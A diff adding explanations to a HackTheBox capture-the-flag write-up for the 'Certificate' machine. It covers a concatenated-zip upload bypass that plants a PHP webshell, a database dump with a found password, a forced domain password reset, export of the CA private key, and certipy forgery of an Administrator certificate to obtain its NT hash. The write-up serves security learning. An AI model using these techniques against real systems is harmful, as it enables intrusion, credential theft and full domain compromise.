@@ -28,6 +28,7 @@ After registering an account and brute-forcing directories, an `upload.php` surf
 ```
 gobuster dir -u http://certificate.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php3,html,txt -t 75
 ```
+`gobuster dir` brute-forces paths from a wordlist, `-x` appends file extensions to try and `-t 75` runs 75 threads.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607111256.png" alt="gobuster results" caption=" " align="center" >}}
 
@@ -64,6 +65,7 @@ zip -r payload.zip payload_files
 
 cat normal.zip payload.zip > combined.zip
 ```
+We build two archives — a benign `normal.zip` and a `payload.zip` containing a PHP shell — then `cat` them into one file: validators read the first archive, the unzip routine reads the last, so the shell slips through.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607112535.png" alt="crafting combined zip" caption=" " align="center" >}}
 
@@ -74,6 +76,7 @@ Upload the combined ZIP and browse to the extracted shell:
 ```
 http://certificate.htb/static/uploads/530bcdb078c2d83e3d96a0788d19bbc3/payload_files/best_shell.php
 ```
+Requesting the extracted `best_shell.php` executes our webshell and gives command execution on the host.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607112645.png" alt="webshell" caption=" " align="center" >}}
 
@@ -86,6 +89,7 @@ A `run.php` holds the database password, so we dump the app DB to harvest user h
 ```
 "C:\\xampp\\mysql\\bin\\mysqldump.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" Certificate_WEBAPP_DB
 ```
+`mysqldump` exports the entire `Certificate_WEBAPP_DB` database (schema + rows) using the creds we found in run.php.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607113407.png" alt="mysqldump output" caption=" " align="center" >}}
 
@@ -94,6 +98,7 @@ Querying the `USERS` table directly is cleaner than reading the dump:
 ```
 "C:\\xampp\\mysql\\bin\\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -D Certificate_WEBAPP_DB -e "SELECT * from USERS;"
 ```
+`mysql -e` runs a single SQL query and returns just the `USERS` table (usernames + password hashes).
 
 ### Cracking
 
@@ -112,6 +117,7 @@ With valid domain creds (`sara.b:Blink182`), we collect the graph to plan the AD
 ```
 ntpdate -u 10.10.11.71 | bloodhound-python -u 'sara.b' -p 'Blink182' -ns 10.10.11.71 -dc DC01.certificate.htb -d certificate.htb -c all
 ```
+`bloodhound-python` collects all AD objects and ACLs as sara.b so we can map who can act on whom.
 
 ## user.txt
 
@@ -120,6 +126,7 @@ ntpdate -u 10.10.11.71 | bloodhound-python -u 'sara.b' -p 'Blink182' -ns 10.10.1
 ```
 bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.10.11.71 set password lion.sk 'password@123'
 ```
+`bloodyAD set password` overwrites lion.sk's password using sara.b's force-reset right over that user.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607121155.png" alt="lion.sk password reset" caption=" " align="center" >}}
 
@@ -144,6 +151,7 @@ With write access to the CA store, we export the CA's private key:
 ```
 certutil -exportPFX my "Certificate-LTD-CA" C:\Users\Public\ca.pfx
 ```
+`certutil -exportPFX` exports the CA certificate **and its private key** from the machine store into `ca.pfx` — the key that signs every certificate in the domain.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607123302.png" alt="exported ca.pfx" caption=" " align="center" >}}
 
@@ -154,6 +162,7 @@ Owning the CA key means we can forge a certificate for *any* user — so we mint
 ```
 certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out forged_admin.pfx
 ```
+`certipy forge` hand-crafts a client-auth certificate for `administrator`, signed by the stolen CA key — no enrollment or approval needed.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607123425.png" alt="forged admin pfx" caption=" " align="center" >}}
 
@@ -162,10 +171,12 @@ Authenticate with the forged certificate to pull the Administrator hash (syncing
 ```
 sudo ntpdate -u 10.10.11.71
 ```
+Syncs our clock to the DC so Kerberos/PKINIT doesn't reject the ticket on skew.
 
 ```
 certipy auth -pfx forged_admin.pfx -username 'administrator' -domain 'certificate.htb' -dc-ip 10.10.11.71
 ```
+`certipy auth` uses the forged PFX to authenticate via PKINIT and returns the Administrator NT hash.
 
 {{< figure src="/images/ctf/htb/Pasted image 20250607123633.png" alt="administrator hash" caption=" " align="center" >}}
 
